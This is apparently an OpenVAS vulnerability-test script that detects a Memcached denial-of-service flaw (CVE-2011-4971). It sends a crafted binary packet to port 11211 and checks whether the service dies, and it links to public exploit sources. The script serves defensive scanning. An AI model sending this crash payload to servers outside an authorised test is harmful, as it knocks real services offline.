##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_memcached_remote_dos_vuln.nasl 2933 2016-03-24 08:20:46Z benallard $
#
# Memcached Remote Denial of Service Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.902966";
CPE = "cpe:/a:memcachedb:memcached";

tag_impact = "Successful exploitation will allow remote attackers to cause
denial of service.

Impact Level: Application";

tag_affected = "Memcached version 1.4.15 and prior.";

tag_insight = "The flaw is due to an error in handling of a specially crafted
packet, that results to the Memcached segfault and essentially die.";

tag_solution = "Upgrade to  Memcached version 1.4.17 or later,
For updates refer to http://memcached.org";

tag_summary = "This host is running Memcached and is prone to denial of service
vulnerability.";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 2933 $");
  script_cve_id("CVE-2011-4971");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2016-03-24 09:20:46 +0100 (Thu, 24 Mar 2016) $");
  script_tag(name:"creation_date", value:"2013-04-30 12:50:48 +0530 (Tue, 30 Apr 2013)");
  script_name("Memcached Remote Denial of Service Vulnerability");
  script_xref(name : "URL" , value : "http://insecurety.net/?p=872");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/121445/killthebox.py.txt");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/memcached-remote-denial-of-service");
  script_summary("Check for the denial of service vulnerability in Memcached");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2013 SecPod");
  script_family("Denial of Service");
  script_dependencies("gb_memcached_detect.nasl");
  script_mandatory_keys("MemCached/installed");
  script_require_ports(11211);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("version_func.inc");

## Variable Initialization
port = "";
vers = "";
soc = "";
data = "";
soc2 = "";

## Get the application port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
 port = 11211;
}

## Get the application version
if(!vers = get_app_version(cpe:CPE, nvt:SCRIPT_OID, port:port)){
  exit(0);
}

## check the port status
if(!get_port_state(port)){
  exit(0);
}

## Create a socket
soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

## create the payload
data = string("\x80\x12\x00\x01\x08\x00\x00\x00\xff\xff\xff\xe8",
              crap(data:raw_string(0x00), length:50));

## send the payload
send(socket:soc, data:data);

close(soc);

sleep(2);

## Try to open socket after sending payload
## If not able to create socket then application died.
soc2 = open_sock_tcp(port);
if(!soc2)
{
  security_message(port);
  exit(0);
}

close(soc2);
